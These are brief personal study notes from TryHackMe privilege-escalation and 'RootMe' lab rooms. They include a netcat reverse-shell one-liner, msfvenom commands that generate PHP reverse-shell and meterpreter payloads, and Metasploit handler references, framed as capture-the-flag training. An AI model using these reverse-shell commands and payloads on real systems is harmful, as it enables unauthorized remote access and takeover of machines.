# R

* Remember for web/general/security
* .todo: metasploit dns
* .todo: web
* web general | terminology | URL may have to be moved
* explose hacking_process

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* exploit/multi/handler
* nc ip port -e /bin/bash

* socat is a sort of ncat+more, but not installed by default, and harder to learn.
* Socat: transfer the socat binary

<hr>

## Overconfidence

--- https://tryhackme.com/room/rrootme

* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
* exploit/multi/handler
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
* `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4455 -o revshell3.php5`
* `sudo bash -c "id"`
* https://www.revshells.com/
* TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
* writeups